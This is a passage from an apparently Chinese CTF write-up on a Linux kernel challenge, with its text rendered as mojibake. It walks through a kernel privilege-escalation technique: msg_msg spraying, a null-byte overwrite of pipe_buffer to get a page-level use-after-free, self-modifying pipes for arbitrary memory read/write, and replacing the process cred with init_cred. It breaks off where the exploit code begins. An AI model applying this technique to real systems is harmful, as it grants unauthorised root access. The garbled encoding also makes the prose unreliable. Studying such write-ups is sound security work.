href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^3CTF2023-d3kcache</a> ä¸­ï¼Œåé¢æƒ³äº†æƒ³ç”¨åœ¨è¿™ä¸ªæ¼æ´ä¸Šä¹Ÿæ˜¯æŒºå¥½çš„ï¼Œæ‰€ä»¥ç°åœ¨ç»™å‡ºä¸€ä»½ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡Œåˆ©ç”¨çš„ exp ï¼šï¼‰</p></blockquote><h3 id="Step-I-åˆ©ç”¨-msg-msg-å®šä½æº¢å‡ºä½ç½®"><a href="#Step-I-åˆ©ç”¨-msg-msg-å®šä½æº¢å‡ºä½ç½®" class="headerlink" title="Step.I - åˆ©ç”¨ msg_msg å®šä½æº¢å‡ºä½ç½®"></a>Step.I - åˆ©ç”¨ <code>msg_msg</code> å®šä½æº¢å‡ºä½ç½®</h3><p>ç”±äºä¸‹æ¬¡å†™å…¥å¿…å®šä¼šå‘ä¸‹ä¸€ä¸ªå¯¹è±¡å†…å†™å…¥ä¸€ä¸ª <code>&#39;=&#39;</code> å’Œä¸€ä¸ª <code>&#39;\0&#39;</code> ï¼Œè€Œè¿™ä¸ª <code>&#39;=&#39;</code> å°±å¾ˆä¸å¯çˆ±ï¼Œå› æ­¤æˆ‘ä»¬é€‰æ‹©<strong>ä¸ç›´æ¥åˆ©ç”¨ä¸å…¶ç›¸é‚»çš„ç¬¬ä¸€ä¸ª 4k å¯¹è±¡ï¼Œè€Œæ˜¯è¦†å†™ä¸å…¶ç›¸é‚»çš„ç¬¬äºŒä¸ª 4k å¯¹è±¡</strong>ï¼Œè¿™æ ·æˆ‘ä»¬ä¾¿èƒ½åªå‘ç¬¬äºŒä¸ª 4k å¯¹è±¡å†…å†™å…¥ä¸€ä¸ªå¯çˆ±çš„ <code>\x00</code> ï¼šï¼‰</p><p>è¿™é‡Œç¬”è€…é€‰æ‹©é¦–å…ˆå †å–· <code>msg_msg</code>ï¼Œåˆ©ç”¨æ¼æ´å°† <code>m_ts</code> æ”¹å¤§ï¼Œé€šè¿‡ <code>MSG_COPY</code> è¯»å–æ£€æŸ¥è¢«è¦†å†™çš„ <code>msg_msg</code> å¹¶<strong>é‡Šæ”¾é™¤äº†è¯¥ msg_msg ä»¥å¤–çš„å…¶ä»– msg_msg</strong></p><h3 id="Step-II-fcntl-F-SETPIPE-SZ-æ›´æ”¹-pipe-buffer-æ‰€åœ¨-slub-å¤§å°ï¼Œæ„é€ é¡µçº§-UAF"><a href="#Step-II-fcntl-F-SETPIPE-SZ-æ›´æ”¹-pipe-buffer-æ‰€åœ¨-slub-å¤§å°ï¼Œæ„é€ é¡µçº§-UAF" class="headerlink" title="Step.II - fcntl(F_SETPIPE_SZ) æ›´æ”¹ pipe_buffer æ‰€åœ¨ slub å¤§å°ï¼Œæ„é€ é¡µçº§ UAF"></a>Step.II - fcntl(F_SETPIPE_SZ) æ›´æ”¹ pipe_buffer æ‰€åœ¨ slub å¤§å°ï¼Œæ„é€ é¡µçº§ UAF</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘æº¢å‡ºçš„ç›®æ ‡å¯¹è±¡ï¼Œç°åœ¨æˆ‘ä»¬ä»…æƒ³è¦ä½¿ç”¨ä¸€ä¸ª <code>\x00</code> å­—èŠ‚å®Œæˆåˆ©ç”¨ï¼Œæ¯«æ— ç–‘é—®çš„æ˜¯æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€äº›åœ¨ç»“æ„ä½“å¤´éƒ¨ä¾¿æœ‰æŒ‡å‘å…¶ä»–å†…æ ¸å¯¹è±¡çš„æŒ‡é’ˆçš„å†…æ ¸å¯¹è±¡ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ <code>pipe_buffer</code> æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„çš„åˆ©ç”¨å¯¹è±¡ï¼Œå…¶å¼€å¤´æœ‰ç€æŒ‡å‘ <code>page</code> ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œè€Œ <code>page</code> çš„å¤§å°ä»…ä¸º <code>0x40</code> ï¼Œå¯ä»¥è¢« 0x100 æ•´é™¤ï¼Œè‹¥æˆ‘ä»¬èƒ½å¤Ÿ<strong>é€šè¿‡ partial overwrite ä½¿å¾—ä¸¤ä¸ªç®¡é“æŒ‡å‘åŒä¸€å¼ é¡µé¢ï¼Œå¹¶é‡Šæ”¾æ‰å…¶ä¸­ä¸€ä¸ª</strong>ï¼Œæˆ‘ä»¬ä¾¿æ„é€ å‡ºäº†<strong>é¡µçº§çš„ UAF</strong>ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/JLZOKejgoPdTkYA.png" alt="original state"></p><p><img src="https://s2.loli.net/2023/05/02/MwTSWUbeaY9Puro.png" alt="null-byte partial overwrite"></p><p><img src="https://s2.loli.net/2023/05/02/R3reNIAT1lG7sfw.png" alt="page-level UAF"></p><p>åŒæ—¶<strong>ç®¡é“çš„ç‰¹æ€§è¿˜èƒ½è®©æˆ‘ä»¬åœ¨ UAF é¡µé¢ä¸Šä»»æ„è¯»å†™</strong>ï¼Œè¿™çœŸæ˜¯å†ç¾å¦™ä¸è¿‡äº†ï¼šï¼‰</p><p>ä½†æ˜¯æœ‰ä¸€ä¸ªå°é—®é¢˜ï¼Œ<code>pipe_buffer</code> æ¥è‡ªäº <code>kmalloc-cg-1k</code> ï¼Œå…¶ä¼šè¯·æ±‚ order-2 çš„é¡µé¢ï¼Œè€Œæ¼æ´å¯¹è±¡å¤§å°ä¸º 4kï¼Œå…¶ä¼šè¯·æ±‚ order-3 çš„é¡µé¢ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥è¿›è¡Œä¸åŒ order é—´çš„å †é£æ°´çš„è¯ï¼Œåˆ™åˆ©ç”¨æˆåŠŸç‡ä¼šå¤§æ‰“æŠ˜æ‰£ :ï¼ˆ</p><p>ä½† pipe å¯ä»¥è¢«æŒ–æ˜çš„æ½œåŠ›è¿œæ¯”æˆ‘ä»¬æƒ³è±¡ä¸­å¤§å¾—å¤šï¼šï¼‰ç°åœ¨è®©æˆ‘ä»¬é‡æ–°å®¡è§† <code>pipe_buffer</code> çš„åˆ†é…è¿‡ç¨‹ï¼Œå…¶å®é™…ä¸Šæ˜¯å•æ¬¡åˆ†é… <code>pipe_bufs</code> ä¸ª <code>pipe_buffer</code> ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>     GFP_KERNEL_ACCOUNT);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„åˆ° <code>pipe_buffer</code> <strong>ä¸æ˜¯ä¸€ä¸ªå¸¸é‡è€Œæ˜¯ä¸€ä¸ªå˜é‡</strong>ï¼Œé‚£ä¹ˆ<strong>æˆ‘ä»¬èƒ½å¦æœ‰æ–¹æ³•ä¿®æ”¹ pipe_buffer çš„æ•°é‡ï¼Ÿ</strong>ç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œpipe ç³»ç»Ÿè°ƒç”¨éå¸¸è´´å¿ƒåœ°ä¸ºæˆ‘ä»¬æä¾›äº† <code>F_SETPIPE_SZ</code> <strong>è®©æˆ‘ä»¬å¯ä»¥é‡æ–°åˆ†é… pipe_buffer å¹¶æŒ‡å®šå…¶æ•°é‡</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">pipe_fcntl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><span class="hljs-type">long</span> ret;<br><br>pipe = get_pipe_info(file, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (!pipe)<br><span class="hljs-keyword">return</span> -EBADF;<br><br>__pipe_lock(pipe);<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> F_SETPIPE_SZ:<br>ret = pipe_set_size(pipe, arg);<br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">pipe_set_size</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>ret = pipe_resize_ring(pipe, nr_slots);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pipe_resize_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_slots)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head, tail, mask, n;<br><br>bufs = kcalloc(nr_slots, <span class="hljs-keyword">sizeof</span>(*bufs),<br>       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>æˆ‘ä»¬å¯ä»¥é€šè¿‡ fcntl() é‡æ–°åˆ†é…å•ä¸ª pipe çš„ pipe_buffer æ•°é‡ï¼Œ</strong>ï¼š</p><ul><li>å¯¹äºæ¯ä¸ª pipe æˆ‘ä»¬<strong>æŒ‡å®šåˆ†é… 64 ä¸ª pipe_bufferï¼Œä»è€Œä½¿å…¶å‘ kmalloc-cg-2k è¯·æ±‚å¯¹è±¡ï¼Œè€Œè¿™å°†æœ€ç»ˆå‘ buddy system è¯·æ±‚ order-3 çš„é¡µé¢</strong></li></ul><p>ç”±æ­¤ï¼Œæˆ‘ä»¬ä¾¿æˆåŠŸä½¿å¾— <code>pipe_buffer</code> ä¸é¢˜ç›®æ¨¡å—çš„å¯¹è±¡<strong>å¤„åœ¨åŒä¸€ order çš„å†…å­˜é¡µä¸Š</strong>ï¼Œä»è€Œæé«˜ cross-cache overflow çš„æˆåŠŸç‡</p><p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äº page ç»“æ„ä½“çš„å¤§å°ä¸º 0x40ï¼Œå…¶å¯ä»¥è¢« 0x100 æ•´é™¤ï¼Œå› æ­¤è‹¥æˆ‘ä»¬æ‰€æº¢å‡ºçš„ç›®æ ‡ page çš„åœ°å€æœ€åä¸€ä¸ªå­—èŠ‚åˆšå¥½ä¸º <code>\x00</code>ï¼Œ  <em>é‚£å°±ç­‰æ•ˆäºæ²¡æœ‰æº¢å‡º</em>  ï¼Œå› æ­¤å®é™…ä¸Šåˆ©ç”¨æˆåŠŸç‡ä»…ä¸º <code>75% </code> ï¼ˆæ‚²ï¼‰</p><h3 id="Step-III-æ„é€ äºŒçº§è‡ªå†™ç®¡é“ï¼Œå®ç°ä»»æ„å†…å­˜è¯»å†™"><a href="#Step-III-æ„é€ äºŒçº§è‡ªå†™ç®¡é“ï¼Œå®ç°ä»»æ„å†…å­˜è¯»å†™" class="headerlink" title="Step.III - æ„é€ äºŒçº§è‡ªå†™ç®¡é“ï¼Œå®ç°ä»»æ„å†…å­˜è¯»å†™"></a>Step.III - æ„é€ äºŒçº§è‡ªå†™ç®¡é“ï¼Œå®ç°ä»»æ„å†…å­˜è¯»å†™</h3><p>æœ‰äº† page-level UAFï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥è€ƒè™‘å‘è¿™å¼ é¡µé¢åˆ†é…ä»€ä¹ˆç»“æ„ä½“ä½œä¸ºä¸‹ä¸€é˜¶æ®µçš„ victim object</p><p>ç”±äºç®¡é“æœ¬èº«ä¾¿æä¾›ç»™æˆ‘ä»¬è¯»å†™çš„åŠŸèƒ½ï¼Œè€Œæˆ‘ä»¬åˆèƒ½å¤Ÿè°ƒæ•´ <code>pipe_buffer</code> çš„å¤§å°å¹¶é‡æ–°åˆ†é…ç»“æ„ä½“ï¼Œé‚£ä¹ˆå†æ¬¡é€‰æ‹© <code>pipe_buffer</code> ä½œä¸º victim object ä¾¿æ˜¯å†è‡ªç„¶ä¸è¿‡çš„äº‹æƒ…ï¼šï¼‰</p><p><img src="https://s2.loli.net/2023/05/02/lfmP8ZxicbjBNSR.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ UAF ç®¡é“<strong>è¯»å– pipe_buffer å†…å®¹ï¼Œä»è€Œæ³„éœ²å‡º pageã€pipe_buf_operations ç­‰æœ‰ç”¨çš„æ•°æ®</strong>ï¼ˆå¯ä»¥åœ¨é‡åˆ†é…å‰é¢„å…ˆå‘ç®¡é“ä¸­å†™å…¥ä¸€å®šé•¿åº¦çš„å†…å®¹ï¼Œä»è€Œå®ç°æ•°æ®è¯»å–ï¼‰ï¼Œç”±äºæˆ‘ä»¬å¯ä»¥é€šè¿‡ UAF ç®¡é“ç›´æ¥æ”¹å†™ <code>pipe_buffer</code> ï¼Œå› æ­¤å°†æ¼æ´è½¬åŒ–ä¸º dirty pipe æˆ–è®¸ä¼šæ˜¯ä¸€ä¸ªä¸é”™çš„åŠæ³•ï¼ˆè¿™ä¹Ÿæ˜¯æœ¬æ¬¡æ¯”èµ›ä¸­ NU1L æˆ˜é˜Ÿçš„è§£æ³•ï¼‰</p><p>ä½†æ˜¯ pipe çš„å¼ºå¤§ä¹‹å¤„è¿œä¸æ­¢è¿™äº›ï¼Œç”±äºæˆ‘ä»¬å¯ä»¥å¯¹ UAF é¡µé¢ä¸Šçš„ <code>pipe_buffer</code> è¿›è¡Œè¯»å†™ï¼Œæˆ‘ä»¬å¯ä»¥<strong>ç»§ç»­æ„é€ å‡ºç¬¬äºŒçº§çš„ page-level UAF</strong>ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/yhNuT7kBj58K6gt.png" alt="secondary page-level UAF"></p><p>ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšå‘¢ï¼Ÿåœ¨ç¬¬ä¸€æ¬¡ UAF æ—¶æˆ‘ä»¬è·å–åˆ°äº† page ç»“æ„ä½“çš„åœ°å€ï¼Œè€Œ page ç»“æ„ä½“çš„å¤§å°å›ºå®šä¸º 0x40ï¼Œ<strong>ä¸”ä¸ç‰©ç†å†…å­˜é¡µä¸€ä¸€å¯¹åº”</strong>ï¼Œè¯•æƒ³è‹¥æ˜¯æˆ‘ä»¬å¯ä»¥ä¸æ–­åœ°ä¿®æ”¹ä¸€ä¸ª pipe çš„ page æŒ‡é’ˆï¼Œ<strong>åˆ™æˆ‘ä»¬ä¾¿èƒ½å®Œæˆå¯¹æ•´ä¸ªå†…å­˜ç©ºé—´çš„ä»»æ„è¯»å†™</strong>ï¼Œå› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬è¦å®Œæˆè¿™æ ·çš„ä¸€ä¸ªåˆ©ç”¨ç³»ç»Ÿçš„æ„é€ </p><p>å†æ¬¡é‡æ–°åˆ†é… <code>pipe_buffer</code> ç»“æ„ä½“åˆ°ç¬¬äºŒçº§ page-level UAF é¡µé¢ä¸Šï¼Œ<strong>ç”±äºè¿™å¼ ç‰©ç†é¡µé¢å¯¹åº”çš„ page ç»“æ„ä½“çš„åœ°å€å¯¹æˆ‘ä»¬è€Œè¨€æ˜¯å·²çŸ¥çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è®©è¿™å¼ é¡µé¢ä¸Šçš„ pipe_buffer çš„ page æŒ‡é’ˆæŒ‡å‘è‡ªèº«ï¼Œä»è€Œç›´æ¥å®Œæˆå¯¹è‡ªèº«çš„ä¿®æ”¹</strong>ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png" alt="third-level self-pointing pipe"></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç¯¡æ”¹ <code>pipe_buffer.offset</code> ä¸ <code>pipe_buffer.len</code> æ¥ç§»åŠ¨ pipe çš„è¯»å†™èµ·å§‹ä½ç½®ï¼Œä»è€Œå®ç°æ— é™å¾ªç¯çš„è¯»å†™ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªå˜é‡ä¼šåœ¨å®Œæˆè¯»å†™æ“ä½œåé‡æ–°è¢«èµ‹å€¼ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<strong>ä¸‰ä¸ªç®¡é“</strong>ï¼š</p><ul><li>ç¬¬ä¸€ä¸ªç®¡é“ç”¨ä»¥è¿›è¡Œå†…å­˜ç©ºé—´ä¸­çš„ä»»æ„è¯»å†™ï¼Œæˆ‘ä»¬é€šè¿‡ä¿®æ”¹å…¶ page æŒ‡é’ˆå®Œæˆ ï¼šï¼‰</li><li>ç¬¬äºŒä¸ªç®¡é“ç”¨ä»¥ä¿®æ”¹ç¬¬ä¸‰ä¸ªç®¡é“ï¼Œä½¿å…¶å†™å…¥çš„èµ·å§‹ä½ç½®æŒ‡å‘ç¬¬ä¸€ä¸ªç®¡é“</li><li>ç¬¬ä¸‰ä¸ªç®¡é“ç”¨ä»¥ä¿®æ”¹ç¬¬ä¸€ä¸ªä¸ç¬¬äºŒä¸ªç®¡é“ï¼Œä½¿å¾—ç¬¬ä¸€ä¸ªç®¡é“çš„ pipe æŒ‡é’ˆæŒ‡å‘æŒ‡å®šä½ç½®ã€ç¬¬äºŒä¸ªç®¡é“çš„å†™å…¥èµ·å§‹ä½ç½®æŒ‡å‘ç¬¬ä¸‰ä¸ªç®¡é“</li></ul><p>é€šè¿‡è¿™ä¸‰ä¸ªç®¡é“ä¹‹é—´äº’ç›¸å¾ªç¯ä¿®æ”¹ï¼Œæˆ‘ä»¬ä¾¿<strong>å®ç°äº†ä¸€ä¸ªå¯ä»¥åœ¨å†…å­˜ç©ºé—´ä¸­è¿›è¡Œè¿‘ä¹æ— é™åˆ¶çš„ä»»æ„è¯»å†™ç³»ç»Ÿ</strong> ï¼šï¼‰</p><h3 id="Step-IV-ææƒ"><a href="#Step-IV-ææƒ" class="headerlink" title="Step.IV - ææƒ"></a>Step.IV - ææƒ</h3><p>æœ‰äº†å†…å­˜ç©ºé—´ä¸­çš„ä»»æ„è¯»å†™ï¼Œææƒä¾¿æ˜¯éå¸¸ç®€ä¾¿çš„ä¸€ä»¶äº‹æƒ…äº†ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©é€šè¿‡ä¿®æ”¹å½“å‰è¿›ç¨‹çš„ task_struct çš„ cred ä¸º init_cred çš„æ–¹å¼æ¥å®Œæˆææƒ</p><p><code>init_cred</code> ä¸ºæœ‰ç€ root æƒé™çš„ credï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å½“å‰è¿›ç¨‹çš„ cred ä¿®æ”¹ä¸ºè¯¥ cred ä»¥å®Œæˆææƒï¼Œè¿™é‡Œiwomå¯ä»¥é€šè¿‡ <code>prctl(PR_SET_NAME, &quot;&quot;);</code> ä¿®æ”¹ <code>task_struct.comm</code> ï¼Œä»è€Œæ–¹ä¾¿æœç´¢å½“å‰è¿›ç¨‹çš„ <code>task_struct</code> åœ¨å†…å­˜ç©ºé—´ä¸­çš„ä½ç½®ï¼šï¼‰</p><p>ä¸è¿‡ <code>init_cred</code> çš„ç¬¦å·æœ‰çš„æ—¶å€™æ˜¯ä¸åœ¨ <code>/proc/kallsyms</code> ä¸­å¯¼å‡ºçš„ï¼Œæˆ‘ä»¬åœ¨è°ƒè¯•æ—¶æœªå¿…èƒ½å¤Ÿè·å¾—å…¶åœ°å€ï¼Œå› æ­¤è¿™é‡Œç¬”è€…é€‰æ‹©é€šè¿‡è§£æ <code>task_struct</code> çš„æ–¹å¼å‘ä¸Šä¸€ç›´æ‰¾åˆ° <code>init</code> è¿›ç¨‹ï¼ˆæ‰€æœ‰è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ï¼‰çš„ <code>task_struct</code> ï¼Œä»è€Œè·å¾— <code>init_cred</code> çš„åœ°å€</p><h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span 